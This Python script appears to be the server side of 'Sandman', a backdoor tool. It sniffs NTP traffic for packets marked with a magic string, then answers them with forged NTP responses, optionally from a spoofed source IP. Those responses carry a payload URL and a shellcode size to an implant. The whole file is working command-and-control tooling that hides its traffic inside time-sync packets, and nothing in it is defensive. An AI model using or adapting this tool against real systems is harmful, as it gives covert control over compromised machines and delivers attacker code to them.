import sys
import scapy.all as scapy
from scapy.layers.ntp import NTP
from scapy.layers.inet import IP, UDP

from time import sleep

PAYLOAD_SIZE = 0x110 # Replace with the real size of your shellcode!
DEFAULT_NTP_MESSAGE_SIZE = 48
NTP_PORT = 123
SLEEP = 1
START_MALICIOUS_MAGIC = 1
END_MALICIOUS_MAGIC = 7
MALICIOUS_MAGIC = b"IDOV31"
SCAPY_NTP_FILTER = "udp and port 123"


def send_data(data: str, ip_packet, spoofed_ip = ""):
    payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data}".encode()

    if not spoofed_ip:
        spoofed_ip = ip_packet.dst
    
    if len(payload) > DEFAULT_NTP_MESSAGE_SIZE:
        amount_of_messages = int(len(payload) / DEFAULT_NTP_MESSAGE_SIZE) + 1
        payload = f"\x1b{MALICIOUS_MAGIC.decode()}{amount_of_messages}".encode()
        chunk_size = DEFAULT_NTP_MESSAGE_SIZE - len(f"\x1b{MALICIOUS_MAGIC.decode()}")

        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
        
        scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)

        for i in range(0, len(data), chunk_size):
            sleep(SLEEP)
            payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data[i:i+chunk_size]}".encode()

            if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
                payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
            scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
    else:
        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
        scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)


def main():
    spoofed_ip = ""
    payload_size = f"\x1b{MALICIOUS_MAGIC.decode()}{PAYLOAD_SIZE}".encode()

    if (len(sys.argv) == 4):
        spoofed_ip = sys.argv[3]

    # Sending payload size.
    if len(payload_size) > DEFAULT_NTP_MESSAGE_SIZE:
        print("[ - ] Payload size is too big.")
        sys.exit(1)
    elif len(payload_size) < DEFAULT_NTP_MESSAGE_SIZE:
        payload_size += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload_size))
    
    # Sniffing NTP packets.
    while True:
        packet = scapy.sniff(iface=sys.argv[1], count=1, filter=SCAPY_NTP_FILTER)
        
        if packet:
            ntp_packet = packet[0][NTP]
            ip_packet = packet[0][IP]
            raw_packet = scapy.raw(ntp_packet)

            # If got a malicious packet - Activate the backdoor!
            if raw_packet[START_MALICIOUS_MAGIC:END_MALICIOUS_MAGIC] == MALICIOUS_MAGIC:
                print("[ + ] Got a packet from the backdoor!\n[ ! ] Entering sandman...")
                send_data(sys.argv[2], ip_packet, spoofed_ip)

                if spoofed_ip:
                    scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_size), verbose=0)
                else:
                    scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_size), verbose=0)
                print(f"[ + ] Activated the backdoor for {ip_packet.src}!")
        sleep(SLEEP)

def print_banner():
    print("""
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
    """)

if __name__ == "__main__":
    print_banner()

    if (len(sys.argv) != 3 and len(sys.argv) != 4):
        print(f"[ - ] Usage: {sys.argv[0]} <interface> <payload url> <optional: ip to spoof>")
        sys.exit(1)
    main()
